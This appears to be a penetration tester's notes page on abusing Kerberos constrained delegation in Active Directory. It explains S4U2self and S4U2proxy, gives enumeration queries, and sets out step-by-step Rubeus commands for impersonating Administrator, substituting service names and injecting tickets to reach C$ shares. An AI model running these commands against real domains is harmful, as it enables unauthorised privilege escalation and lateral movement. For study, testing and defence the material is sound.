## Information

| Aspect | Summary |
| ------------------ | ---------------------------------------------------------------------------------------------------------------------- |
| What it is | Kerberos delegation based on S4U (S4U2self + S4U2proxy) that allows a service to impersonate users without using their TGT |
| How it works | The service requests a TGS on behalf of the user using its own account, controlled by `msDS-AllowedToDelegateTo` |
| What you get | Impersonated TGS tickets, NOT TGTs |
| Scope | You can impersonate any user, including DA, but only toward the allowed SPNs |
| Control            | Totalmente definido por `msDS-AllowedToDelegateTo`                                                                     |
| Lateral movement | Limited and directed, only to listed services such as MSSQL, CIFS, HTTP, LDAP, and so on |
| Stealth / OPSEC | High: the user does not need to authenticate and you do not need to touch LSASS |
| Escalation | Possible only if the allowed SPNs are sensitive, for example `CIFS/DC` or `LDAP/DC` |
| Key limitation | ❌ You cannot request the user's TGT<br>❌ You cannot step outside the allowed SPNs |

- [ ] Requirements

- Machine or account with `msDS-AllowedToDelegateTo` configured
- Target SPN defined in `msDS-AllowedToDelegateTo`
- SYSTEM/Admin privileges to inject tickets and a valid TGT for that machine account
- To impersonate any user through S4U2self, the flag `TRUSTED_TO_AUTHENTICATE_FOR_DELEGATION (T2A4D)` must be present (protocol transition enabled)

| Protocol transition (S4U2self)                                                                                                                                                                                                                                                                                                                                                                    | Kerberos only (S4U2proxy)                                                                                                                                                                                                                                                                                                                                                                                                                                                                             |
| ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| Allows a service (host or service account) to obtain a Kerberos ticket on behalf of a user even when that user did not previously authenticate with Kerberos, for example through NTLM or form-based authentication. The server can therefore convert a non-Kerberos authentication into a Kerberos context and then delegate access to internal services with S4U2Proxy. | Once the host gets an initial forwardable TGS through S4U2Self that represents the user to the service itself, it uses that ticket to run S4U2Proxy and ask the KDC for a second TGS aimed at the target service specified in `msDS-AllowedToDelegateTo`. The KDC validates that the delegation is allowed and, if valid, emits the final TGS actually used to authenticate to the target resource on behalf of the user. |

> Why does it still exist? Because many companies still run legacy applications that cannot authenticate with Kerberos but still need to integrate with resources that require it. S4U2self is the bridge between those two worlds, so it remains necessary in many mixed environments. Disable it and you break compatibility in legacy apps.

- [ ] Flow

- **Initial user authentication**: The user authenticates to the front-end, with Kerberos or without Kerberos (NTLM, form-based auth, etc.). At this stage, no user TGT exists on the server.
- **Creation of TGS #1 (S4U2Self)**: The front-end, using its own account with `TRUSTED_TO_AUTHENTICATE_FOR_DELEGATION`, requests from the KDC an impersonated and forwardable TGS for the user to itself. This is **TGS #1**. No user TGT is ever created or exposed.
- **Request for TGS #2 (S4U2Proxy)**: The front-end uses **TGS #1** as proof of the user’s identity and sends a new TGS-REQ to the KDC for the target service SPN (`MSSQL`, `CIFS`, `HTTP`, etc.).
- **Delegation validation**: The KDC validates that the requested SPN is allowed in `msDS-AllowedToDelegateTo` and that the delegation is valid.
- **Issuance of TGS #2**: The KDC issues a second TGS, now for the back-end service and in the name of the user. This is **TGS #2**.
- **Access to the back-end service**: The front-end uses **TGS #2** to authenticate to the back-end service and access the requested resource on behalf of the user.

```
1 User → Front-end
2 Front-end → KDC
3 KDC → Front-end
4 Front-end → KDC
5 KDC → Front-end
6 Front-end → Back-end
```
## Enumeration

1. Search for computers with `msDS-AllowedToDelegateTo`

- [ ] ldapsearch

```powershell
# HOSTS
ldapsearch "(&(objectCategory=computer)(msDS-AllowedToDelegateTo=*))" msDS-AllowedToDelegateTo,sAMAccountName

# USERS
ldapsearch "(&(objectCategory=person)(objectClass=user)(msDS-AllowedToDelegateTo=*))" msDS-AllowedToDelegateTo,sAMAccountName
```

- [ ] AD

```powershell
# HOSTS
Get-ADObject -LDAPFilter "(&(objectCategory=computer)(msDS-AllowedToDelegateTo=*))" -Properties sAMAccountName,msDS-AllowedToDelegateTo | select sAMAccountName,msDS-AllowedToDelegateTo

# USERS
Get-ADObject -LDAPFilter "(&(objectCategory=person)(objectClass=user)(msDS-AllowedToDelegateTo=*))" -Properties sAMAccountName,msDS-AllowedToDelegateTo | select sAMAccountName,msDS-AllowedToDelegateTo
```

- [ ] POWERVIEW

```powershell
# HOSTS
Get-DomainObject -LDAPFilter "(&(objectCategory=computer)(msDS-AllowedToDelegateTo=*))" -Properties samaccountname,msDS-AllowedToDelegateTo | select samaccountname,msDS-AllowedToDelegateTo
Get-DomainComputer -TrustedToAuth
# sAMAccountName: host$
# msDS-AllowedToDelegateTo: cifs/host.domain.com, cifs/host

# USUARIOS
Get-ADObject -LDAPFilter "(&(objectCategory=person)(objectClass=user)(msDS-AllowedToDelegateTo=*))" -Properties sAMAccountName,msDS-AllowedToDelegateTo | select sAMAccountName,msDS-AllowedToDelegateTo
Get-DomainUser -TrustedToAuth
```

> `host$` is allowed to delegate through constrained delegation only to `cifs/host.domain.com | cifs/host`.

2. Get the UAC value for `host$` to see whether the `TRUSTED_TO_AUTH_FOR_DELEGATION` flag is enabled

```powershell
# ldapsearch
ldapsearch -x -H ldap://IP_DC -D "DOMAIN\user" -w "pass" -b "DC=domain,DC=local" "(&(samAccountType=805306369)(samaccountname=host$))" dn sAMAccountName msDS-AllowedToDelegateTo

# AD
Get-ADComputer -Identity host -Properties msDS-AllowedToDelegateTo | Select-Object Name,DistinguishedName,msDS-AllowedToDelegateTo

# Powerview 
Get-DomainComputer -Identity host -Properties msDS-AllowedToDelegateTo | Select-Object Name,distinguishedname,msDS-AllowedToDelegateTo

# SALIDA
# userAccountControl: 16781312
```

3. Perform a bitwise AND with the decimal value of `TRUSTED_TO_AUTH_FOR_DELEGATION` (16777216):

```powershell
[System.Convert]::ToBoolean(16781312 -band 16777216)
[Convert]::ToBoolean(16781312 -band 16777216)

True   # protocol transition enabled
False  # protocol transition disabled
```

- `True`: the host can request Kerberos tickets for users who did not use Kerberos originally (it can perform S4U2self)
- `False`: the host cannot perform S4U2self
- S4U2self = give me a ticket as if I were this user
- S4U2proxy = now give me access to this service using that ticket

> `host$` can delegate only to `cifs/host.domain.com`, and it also has protocol transition enabled (`TRUSTED_TO_AUTH_FOR_DELEGATION`: `True`), which lets it generate identities for arbitrary users and use them specifically against that service.
## Exploitation

If an attacker compromises a machine configured with constrained delegation, they will only be able to request service tickets (TGSs) for the services defined in the `msDS-AllowedToDelegateTo` attribute. However, the real attack scope depends on whether protocol transition (S4U2self) is enabled:

If `TRUSTED_TO_AUTH_FOR_DELEGATION` is enabled, the machine can “invent” the identity of any user even if that user has never logged on there. Specifically:

- The machine generates an S4U2self ticket for any domain user (even if they have never passed through that host). Ideally, you impersonate the highest-privileged user who has logged on there (usually an administrator), as this maximizes access and impact on `\\host`
- It then uses S4U2proxy to request a TGS for the services allowed in `msDS-AllowedToDelegateTo`

> Rubeus performs both steps automatically (S4U2self and then S4U2proxy):

- [ ] Rubeus

1. Obtain the TGT of the compromised machine

```powershell
# Only if the TGT is cached
.\Rubeus.exe dump /luid:0x3e7 /service:krbtgt /nowrap

# Alternative: Request it from the KDC using the host$ key/hash
.\Rubeus.exe asktgt /user:host$ /domain:domain.com /rc4:NTLM_HASH /nowrap
```

2. Request a TGS through S4U2self for the target user

```powershell
.\Rubeus.exe s4u /user:host$ /msdsspn:cifs/host /impersonateuser:Administrator /nowrap /ticket:

# Alternative without a TGT, using only the NTLM hash of host$
.\Rubeus.exe s4u /user:host$ /impersonateuser:Administrator /msdsspn:cifs/host /nowrap /rc4:NTLM_HASH 
``` 

- `/user`: compromised machine account with constrained delegation (we are on this host)
- `/msdsspn`: allowed SPN service (from `msDS-AllowedToDelegateTo`)
- `/impersonateuser`: user to impersonate
- `/ticket`: TGT of the `host$` machine (base64 or `.kirbi`)

3. Confirm the impersonation by describing the received ticket

```powershell
.\Rubeus.exe describe /ticket:
# ServiceName              :  cifs/host
# UserName                 :  Administrator (NT_ENTERPRISE)
# Flags                    :  ...., renewable, forwarded, forwardable
```

`forwardable`: allows the TGS to be delegated to other services (required for S4U2proxy), but it cannot be used to request new TGSs

4. Inject the ticket and access the resource while impersonating the target user

```powershell
.\Rubeus.exe ptt /ticket:
run klist
ls \\host.domain.local\c$
``` 

## Service Name Substitution

- [ ] **Enumeration**

```powershell
# 1. Look for machines whose msDS-AllowedToDelegateTo attribute is not null
ldapsearch "(sAMAccountName=host$)" --attributes msDS-AllowedToDelegateTo,sAMAccountName
# sAMAccountName: host$
# msDS-AllowedToDelegateTo: time/host.domain.com, time/host

# 2. Get the UAC value for host$ to see whether the TRUSTED_TO_AUTH_FOR_DELEGATION flag is enabled
ldapsearch (&(samAccountType=805306369)(samaccountname=host$)) --attributes userAccountControl
# userAccountControl: 16781312

# 3. Perform a bitwise AND with the decimal value of TRUSTED_TO_AUTH_FOR_DELEGATION (16777216):
[Convert]::ToBoolean(16781312 -band 16777216)
# True = protocol transition enabled, it can perform S4U2self
# False = protocol transition disabled, the machine CANNOT perform S4U2self
```

> `host$` is allowed to delegate with constrained delegation only to the services `time/host.domain.com` and `time/host`

Even if `time` is specified, in practice it is often possible to access other services on the same server as well, such as: `HOST`, `RPCSS`, `HTTP`, `WSMAN`, etc., because they all share the same machine identity (`s4u2self`)

- [ ] Exploitation

```powershell
# 1. Obtain the TGT of host$ with the msDS-AllowedToDelegateTo attribute (High-Integrity Token)
.\Rubeus.exe dump /luid:0x3e7 /service:krbtgt /nowrap

# 2. Request the TGS for the allowed SPN (time/host):
.\Rubeus.exe s4u /user:host$ /impersonateuser:Administrator /msdsspn:time/host /altservice:cifs /nowrap /ticket:

# Alternative without a TGT, using only the NTLM hash of host$
.\Rubeus.exe s4u /user:host$ /impersonateuser:Administrator /msdsspn:time/host /altservice:cifs /nowrap /rc4:NTLM_HASH 

# 3. Confirm changes
.\Rubeus.exe describe /ticket:
# ServiceName              : cifs/host
# UserName                 : Administrator (NT_ENTERPRISE)
# Flags                    : ..., forwardable

# 4. Ptt
.\Rubeus.exe ptt /ticket:

# List SMB shares
ls \\host.domain.local\c$
```

- `/user`: compromised machine account
- `/msdsspn`: allowed SPN by policy
- `/altservice`: the new SPN you want in the ticket, for example `cifs`
- `/impersonateuser`: the user to impersonate, usually `Administrator`. By default, every domain-joined Windows host automatically registers an SPN for its SMB/CIFS service
- `/ticket`: the TGT of the `host` machine

> The `altservice` parameter actually accepts a comma-separated list of services, for example `/altservice:cifs,host,http`. This will produce 3 new tickets that you can then inject.
